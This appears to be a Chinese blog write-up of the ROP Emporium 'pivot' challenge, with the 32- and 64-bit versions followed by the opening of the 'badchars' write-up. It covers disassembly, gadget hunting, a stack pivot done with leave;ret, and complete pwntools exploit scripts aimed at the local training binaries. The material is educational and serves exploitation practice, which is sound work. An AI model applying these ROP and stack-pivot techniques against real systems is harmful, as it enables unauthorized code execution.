<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./pivot32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level7_pivot/32/pivot32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>然后我们查看下程序中的函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./pivot32</span> </span><br><span class="line">···</span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048570    1     50 entry0</span><br><span class="line">0x080485a3    1      4 fcn.080485a3</span><br><span class="line">0x08048530    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x08048488    3     35 sym._init</span><br><span class="line">0x080485c0    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x08048560    1      6 sym..plt.got</span><br><span class="line">0x080488a4    1     20 sym._fini</span><br><span class="line">0x080485d0    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048610    4     54 sym.register_tm_clones</span><br><span class="line">0x08048650    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048680    1      6 sym.frame_dummy</span><br><span class="line">0x08048750    1    199 sym.pwnme</span><br><span class="line">0x08048550    1      6 sym.imp.memset</span><br><span class="line">0x08048500    1      6 sym.imp.puts</span><br><span class="line">0x080484d0    1      6 sym.imp.printf</span><br><span class="line">0x080484c0    1      6 sym.imp.read</span><br><span class="line">0x08048817    1     21 sym.uselessFunction</span><br><span class="line">0x08048520    1      6 sym.imp.foothold_function</span><br><span class="line">0x08048510    1      6 sym.imp.exit</span><br><span class="line">0x080488a0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048840    4     93 sym.__libc_csu_init</span><br><span class="line">0x080485b0    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048686    3    202 main</span><br><span class="line">0x08048540    1      6 sym.imp.setvbuf</span><br><span class="line">0x080484f0    1      6 sym.imp.malloc</span><br><span class="line">0x080484e0    1      6 sym.imp.free</span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">ii</span></span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080484c0 GLOBAL FUNC       read</span><br><span class="line">2   0x080484d0 GLOBAL FUNC       printf</span><br><span class="line">3   0x080484e0 GLOBAL FUNC       free</span><br><span class="line">4   0x080484f0 GLOBAL FUNC       malloc</span><br><span class="line">5   0x08048500 GLOBAL FUNC       puts</span><br><span class="line">6   0x00000560 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">7   0x08048510 GLOBAL FUNC       exit</span><br><span class="line">8   0x08048520 GLOBAL FUNC       foothold_function</span><br><span class="line">9   0x08048530 GLOBAL FUNC       __libc_start_main</span><br><span class="line">10  0x08048540 GLOBAL FUNC       setvbuf</span><br><span class="line">11  0x08048550 GLOBAL FUNC       memset</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看到程序除了自身的<code>pwnme</code> <code>usefulFunction</code>外，还导入了链接库中的<code>foothold_function</code>，我们很容易想到，可能要在程序中调用<code>foothold_function</code>函数，通过它来泄露出libc的地址。</p>
<p>我们依次来看下这几个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x08048570</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x08048750</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(uint arg_8h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, arg_8h);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x8048994</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, arg_8h, <span class="number">0x100</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x8048994</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pwnme</code>函数也告诉了我们调用链接库中的<code>ret2win</code>函数来拿flag，并且，为了降低难度，还给出了我们一块地址（下边称为<strong>新栈</strong>），让我们进行栈迁移操作。根据提示信息，第一次发送的内容会被存储在新栈中，第二次发送的内容用来触发栈溢出。</p>
<p>注：从第二个<code>read</code>函数的参数中我们可以看到，它接收 0x38&#x3D;56byte 长的输入，我们计算得到的偏移量为 44 ，所以，真正我们能操作的溢出长度为 56 - 44 &#x3D; 12byte。这个长度是肯定不够存放完整的ROP链的，从这里我们也可以看到需要用到栈迁移技术。</p>
<p>接下来我们看下<code>usefulFunction</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x08048750</span>]&gt; s sym.uselessFunction </span><br><span class="line">[<span class="number">0x08048817</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.uselessFunction</span><br><span class="line">      <span class="title function_">noreturn</span> </span><br><span class="line">               <span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.foothold_function();</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>usefulFunction</code>函数只是调用了<code>foothold_function</code>函数，这也是一个提示，提示我们通过这个函数来泄露地址。</p>
<p>我们就加载分析链接库，看下<code>foothold_function</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./libpivot32.so</span></span><br><span class="line"><span class="meta prompt_">[0x00000680]&gt; </span><span class="language-bash">s sym.foothold_function</span> </span><br><span class="line"><span class="meta prompt_">[0x0000077d]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">// WARNING: Variable defined which should be unmapped: var_4h</span><br><span class="line"></span><br><span class="line">void sym.foothold_function(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    int32_t iVar1;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    iVar1 = sym.__x86.get_pc_thunk.ax();</span><br><span class="line">    sym.imp.puts(iVar1 + 0x2a7);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用IDA看的比较明显，函数的作用就是输出一串字符串，也是一些提示信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foothold_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>现在我们结合着函数内容，来整理一下思路：</p>
<ol>
<li>程序需要两个输入，在第二个输入处存在栈溢出（溢出长度较短），并且会将第一个输入处输入的内容存储到新栈上。</li>
<li>我们可以利用第二个输入来进行栈迁移，在第一个输入处，输入完整的ROP链。</li>
</ol>
<p>接下来，就是找相关的gadgets了，反汇编后可以看到程序中仍然存在<code>usefulGadgets</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -dj .text -M intel ./pivot32</span> </span><br><span class="line">···</span><br><span class="line">0804882c &lt;usefulGadgets&gt;:</span><br><span class="line"> 804882c:	58                   	pop    eax</span><br><span class="line"> 804882d:	c3                   	ret    </span><br><span class="line"> 804882e:	94                   	xchg   esp,eax</span><br><span class="line"> 804882f:	c3                   	ret    </span><br><span class="line"> 8048830:	8b 00                	mov    eax,DWORD PTR [eax]</span><br><span class="line"> 8048832:	c3                   	ret    </span><br><span class="line"> 8048833:	01 d8                	add    eax,ebx</span><br><span class="line"> 8048835:	c3                   	ret    </span><br><span class="line"> 8048836:	66 90                	xchg   ax,ax</span><br><span class="line"> 8048838:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883a:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883c:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883e:	66 90                	xchg   ax,ax</span><br></pre></td></tr></table></figure>

<p><code>xchg</code>指令在上一个题中我们了解到，它的作用是交换两个操作数的值，并且也存在<code>pop eax;ret</code>，我们就可以利用这两个gadget来修改esp寄存器做栈迁移。但我比较喜欢使用<code>leave;ret</code>，而且程序中刚好有，这里我就使用<code>leave</code>来做栈迁移。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;leave|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080485f5 : leave ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>

<p><code>mov eax,DWORD PTR [eax];ret</code>，<code>add eax,ebx;ret</code>，这两个gadget乍一看并不是很清楚他们是干嘛的，结合这道题仔细分析一下ret2libc的过程就懂了。</p>
<p>通常我们是需要一个输出函数，比如<code>write\puts</code>等来打印出我们调用过的链接库中函数（具体到这里就是<code>foothold_function</code>）在<code>got</code>表中的真实地址。然后计算出libc库加载后的基地址。但是这样的话，如果我们就需要构造二次溢出，而且这里二次溢出的情况比较复杂（涉及到栈迁移，而且程序每次调用<code>pwnme</code>分配的新栈是不固定的（我测了几次，应该是不固定的）），如果我们使用二次溢出的话就会比较麻烦。</p>
<p>这里我们就换一种思路，其实，只要调用过链接库中的函数（<code>foothold_function</code>）之后，它的<code>got</code>表内存储的就已经是绑定后的真实地址了，我们之前将它打印出来只是为了方便我们通过程序来做计算。这里我们通过程序来计算反而会变的复杂，我们就通过gadget来操作。</p>
<p>思考一下，我们通过<code>ELF.got[&#39;foothold_function&#39;]</code>获取的只是<code>got</code>表表项的地址，在这个地址内存储的值才是真正我们想要的<code>foothold_function</code>的真实地址。这里，我们就明白了<code>mov eax,DWORD PTR [eax];ret</code>这个gadget的作用，我们将<code>got</code>表表项的地址通过<code>pop eax</code>传入<code>eax</code>，然后通过<code>move</code>获取表项内存储的<code>foot</code>函数的真实地址存入<code>eax</code>。此时我们也就明白了<code>add eax,ebx</code>这个gadget的作用，我们将<code>foothold_function</code>与<code>ret2win</code>这两个函数之间的偏移量存入<code>ebx</code>，通过<code>add</code>我们就能得到<code>ret2win</code>函数的真实地址(存放在<code>eax</code>)。接着我们就能调用<code>ret2win</code>函数拿到flag。</p>
<p>按照这个思路，我们还需要操作<code>ebx</code>和调用<code>ret2win</code>的gadgets。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804882c : pop eax ; ret</span><br><span class="line">0x0804889b : pop ebp ; ret</span><br><span class="line">0x08048898 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484a9 : pop ebx ; ret</span><br><span class="line">0x0804889a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048899 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 8</span><br></pre></td></tr></table></figure>

<p><code>0x080484a9 </code> 地址处的<code>pop ebx ; ret</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;call|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804857b : call 0x80485a9</span><br><span class="line">0x0804848c : call 0x80485c6</span><br><span class="line">0x080485f0 : call eax</span><br><span class="line">0x0804863d : call edx</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>

<p><code>0x080485f0</code>地址处的 <code>call eax</code>，或者<code>jmp eax</code>也是可以的。</p>
<p>（PS：这里我当时犯病糊涂了，想着为什么不能直接在返回地址处直接填<code>ret2win</code>函数的真实地址，而要再通过<code>call</code>或者<code>jmp</code>来调用，原因就是我们拿不到<code>eax</code>中存储的值，如果能拿到，也就是向往常那样二次溢出的情况，是可以用的，只能说犯病很严重。）</p>
<p>我们所需要的东西都找齐了，可以构造我们的ROP链了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROP1:</span><br><span class="line">padding			#迁移后要 pop到ebp中的值</span><br><span class="line">foothold.plt	#调用foothold函数</span><br><span class="line">pop_eax			#将got表表项地址pop到eax</span><br><span class="line">foothold.got 	</span><br><span class="line">mov_eax_[eax]	#获取foothold真实地址</span><br><span class="line">pop_ebx			#将offset pop到ebx</span><br><span class="line">offset			#offset = ret2win - foothold </span><br><span class="line">add_eax_ebx		#计算ret2win真实地址</span><br><span class="line">call_eax		#调用ret2win函数</span><br><span class="line"></span><br><span class="line">ROP2:</span><br><span class="line">padding			#offset - 4 把fake ebp的空间留出来</span><br><span class="line">fake ebp		#我们从程序输出中获取的新栈地址</span><br><span class="line">leave;ret		#栈迁移</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>完整的exploit代码如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lib =ELF(<span class="string">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = e.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_function_got = e.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_offset = lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取foodhold与ret2win函数之间的偏移量</span></span><br><span class="line"><span class="comment"># foodhold的真实地址+offset = ret2win函数的真实地址</span></span><br><span class="line">offset = ret2win_offset-foothold_function_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets:</span></span><br><span class="line"><span class="comment">#这两条gadgets获取到foothold的真实地址，并将其保存到寄存器中，用于后续操作</span></span><br><span class="line">pop_eax_addr = <span class="number">0x0804882c</span> 	<span class="comment"># pop  eax;	ret  </span></span><br><span class="line">mov_eax_eaxs_addr = <span class="number">0x08048830</span> 	<span class="comment"># mov  eax,DWORD PTR [eax];ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xchg_esp_eax_addr = 0x0804882e 	# xchg esp,eax;ret </span></span><br><span class="line"><span class="comment"># pop_ebp_addr = 0x0804889b    # pop ebp ; ret   </span></span><br><span class="line"><span class="comment">#调用eax中保存的函数地址处的函数</span></span><br><span class="line">call_eax = <span class="number">0x080485f0</span> <span class="comment"># call eax</span></span><br><span class="line"><span class="comment"># 除了call之外也可以使用jmp命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将offset保存到ebx中，计算ret2win的真实地址</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x080484a9</span>    <span class="comment"># pop ebx ; ret</span></span><br><span class="line">add_eax_ebx_addr = <span class="number">0x08048833</span>    <span class="comment"># add  eax,ebx;ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成栈迁移</span></span><br><span class="line">leave_addr = <span class="number">0x080485f5</span>    <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)</span><br><span class="line">fake_ebp = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#迁移后的栈中存放的rop chain</span></span><br><span class="line">payload1 = p32(<span class="number">1</span>) <span class="comment">#虚假的ebp</span></span><br><span class="line">payload1+= p32(foothold_function_plt)</span><br><span class="line">payload1+= p32(pop_eax_addr)</span><br><span class="line">payload1+= p32(foothold_function_got)</span><br><span class="line">payload1+= p32(mov_eax_eaxs_addr)</span><br><span class="line">payload1+= p32(pop_ebx_addr)</span><br><span class="line">payload1+= p32(offset)</span><br><span class="line">payload1+= p32(add_eax_ebx_addr)</span><br><span class="line">payload1+= p32(call_eax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span> - <span class="number">4</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2 利用leave指令跟fake_ebp来实现栈迁移</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload2+= p32(fake_ebp)</span><br><span class="line">payload2+= p32(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位情况与32位情况相同，需要注意一点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROP2:</span><br><span class="line">padding		# 40 - 8 </span><br><span class="line">fake rbp</span><br><span class="line">leave		</span><br></pre></td></tr></table></figure>

<p>这里的 padding 长度为偏移量 - 8，64位环境下，<code>rbp</code>存储占8字节</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = e.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_function_got = e.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_offset = lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = ret2win_offset - foothold_function_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#Gadgets</span></span><br><span class="line">pop_rax_addr = <span class="number">0x4009bb</span> <span class="comment"># pop  rax;ret    </span></span><br><span class="line">xchg_rsp_rax_addr = <span class="number">0x4009bd</span> <span class="comment"># xchg rsp,rax;ret    </span></span><br><span class="line">mov_rax_raxs_addr = <span class="number">0x4009c0</span> <span class="comment"># mov  rax,QWORD PTR [rax];ret    </span></span><br><span class="line">add_rax_rbp_addr = <span class="number">0x4009c4</span> <span class="comment"># add  rax,rbp;ret    </span></span><br><span class="line">pop_rbp_addr = <span class="number">0x4007c8</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave_addr = <span class="number">0x4008ef</span> <span class="comment"># leave ; ret</span></span><br><span class="line">call_rax_addr = <span class="number">0x00000000004006b0</span> <span class="comment"># call rax</span></span><br><span class="line">jmp_rax_addr = <span class="number">0x00000000004007c1</span> <span class="comment"># jmp rax</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)</span><br><span class="line">fake_ebp = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">1</span>)</span><br><span class="line">payload1+= p64(foothold_function_plt)</span><br><span class="line">payload1+= p64(pop_rax_addr)</span><br><span class="line">payload1+= p64(foothold_function_got)</span><br><span class="line">payload1+= p64(mov_rax_raxs_addr)</span><br><span class="line">payload1+= p64(pop_rbp_addr)</span><br><span class="line">payload1+= p64(offset)</span><br><span class="line">payload1+= p64(add_rax_rbp_addr)</span><br><span class="line">payload1+= p64(call_rax_addr)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span> - <span class="number">8</span></span><br><span class="line"><span class="comment">#64bit，是8字节</span></span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload2+= p64(fake_ebp)</span><br><span class="line">payload2+= p64(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge5_badchars</title>
    <url>/2023/03/15/ROP_Emporium/Challenge5-badchars/</url>
    <content><![CDATA[<h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><p>题目链接：<a href="https://ropemporium.com/challenge/badchars.html">https://ropemporium.com/challenge/badchars.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据题目描述可知，我们往栈中的输入会有一些坏字节，在我们查找偏移量的过程中就会遇到。</p>
<span id="more"></span>

<p>我们首先还是先查看下保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec badchars32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level5_badchars/32/badchars32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>跟前几个都一样，接着我们查看下程序中的函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./badchars32</span></span><br><span class="line"><span class="meta prompt_">[0x080483f0]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x080483f0    1     50 entry0</span><br><span class="line">0x08048423    1      4 fcn.08048423</span><br><span class="line">0x080483c0    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x0804837c    3     35 sym._init</span><br><span class="line">0x08048440    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080483e0    1      6 sym..plt.got</span><br><span class="line">0x080485c4    1     20 sym._fini</span><br><span class="line">0x08048450    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048490    4     54 sym.register_tm_clones</span><br><span class="line">0x080484d0    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048500    1      6 sym.frame_dummy</span><br><span class="line">0x0804852a    1     25 sym.usefulFunction</span><br><span class="line">0x080483d0    1      6 sym.imp.print_file</span><br><span class="line">0x080485c0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048560    4     93 sym.__libc_csu_init</span><br><span class="line">0x08048430    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048506    1     36 main</span><br><span class="line">0x080483b0    1      6 sym.imp.pwnme</span><br><span class="line"><span class="meta prompt_">[0x080483f0]&gt; </span><span class="language-bash">ii</span></span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080483b0 GLOBAL FUNC       pwnme</span><br><span class="line">2   0x000003e0 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">3   0x080483c0 GLOBAL FUNC       __libc_start_main</span><br><span class="line">4   0x080483d0 GLOBAL FUNC       print_file</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>pwnme</code>函数跟<code>print_file</code>函数还是在链接库中，同样还存在<code>usefulFunction</code>函数，我们依次来查看三个函数内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x080483f0</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x0804852a</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>usefulFunction</code>函数跟上一题一样，所以，这题的思路也是要调用<code>print_file</code>函数来打印flag。我们加载分析链接库，查看其他函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x000005c0</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x000006bd</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_4h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> uVar1;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    uint s;</span><br><span class="line">    <span class="type">uint32_t</span> var_34h;</span><br><span class="line">    <span class="type">uint32_t</span> var_30h;</span><br><span class="line">    uint var_28h;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    sym.imp.setvbuf(**(unaff_EBX + <span class="number">0x192f</span>), <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x1b3</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x1cc</span>);</span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;var_28h, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x1d3</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(unaff_EBX + <span class="number">500</span>);</span><br><span class="line">    uVar1 = sym.imp.read(<span class="number">0</span>, &amp;var_28h, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">for</span> (var_34h = <span class="number">0</span>; var_34h &lt; uVar1; var_34h = var_34h + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (var_30h = <span class="number">0</span>; var_30h &lt; <span class="number">4</span>; var_30h = var_30h + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(&amp;var_28h + var_34h) == *(*(unaff_EBX + <span class="number">0x1927</span>) + var_30h)) &#123;</span><br><span class="line">                *(&amp;var_28h + var_34h) = <span class="number">0xeb</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x1f7</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pwnme</code>函数中在<code>read</code>函数之后多了一段循环代码，这里的反编译就没有IDA的看起来更容易懂，但根据题意和调试，也可推断出，这段代码的作用就是遍历我们输入的字符串，如果满足条件，将会把字符给替换成<code>0xeb</code>，下边的IDA反编译的结果就比较直观了。</p>
